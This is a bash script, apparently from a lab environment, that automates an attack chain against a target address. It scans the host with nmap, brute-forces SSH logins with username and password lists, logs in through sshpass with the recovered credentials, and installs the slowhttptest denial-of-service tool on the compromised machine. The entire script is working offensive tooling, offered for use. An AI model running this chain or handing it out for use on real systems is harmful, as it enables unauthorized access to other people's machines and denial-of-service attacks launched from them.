#!/bin/bash -x

rm credential*
rm test*
sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install nmap
sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install sshpass
sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install python-pip
sudo apt-get update
pip install paramiko
nmap -T4 -F $1 > test1.txt
sleep 10
python attack1.py > credential1.txt
python SSHBruteForce.py -i $(cat credential1.txt) -U ./usernames.txt -P ./passwords.txt -d true >> test.txt
python attack.py > credential2.txt
i=1

#while read line; do
#sshpass -p 'vagrant' ssh vagrant@172.16.10.2	
#done < credentials1.txt

IFS=' ' read -r -a array <<< "$(cat credential2.txt)"
echo "${array[1]}"
sshpass -p "${array[0]}" ssh -t -t "${array[1]}"@$(cat credential1.txt) 'sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install slowhttptest'
